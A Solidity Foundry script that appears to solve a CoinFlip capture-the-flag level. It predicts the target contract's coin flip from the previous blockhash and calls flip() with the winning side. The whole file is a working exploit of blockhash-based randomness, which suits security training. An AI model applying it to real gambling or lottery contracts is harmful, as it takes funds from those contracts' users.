// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {ICoinFlip} from "src/interfaces/ICoinFlip.sol";

contract CoinFlipScript is Script {
    uint256 deployerPrivateKey;
    address public coinFlipAddress;
    ICoinFlip coinFlip;

    function setUp() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        coinFlipAddress = 0xF5c37e18286acA2BbED0B607C3e2c1b41135149D;
        coinFlip = ICoinFlip(coinFlipAddress);
    }

    function run() public {
        vm.startBroadcast(deployerPrivateKey);
        _attack();
        vm.stopBroadcast();
    }

    function _attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1 ? true : false;
        coinFlip.flip(side);
    }
}
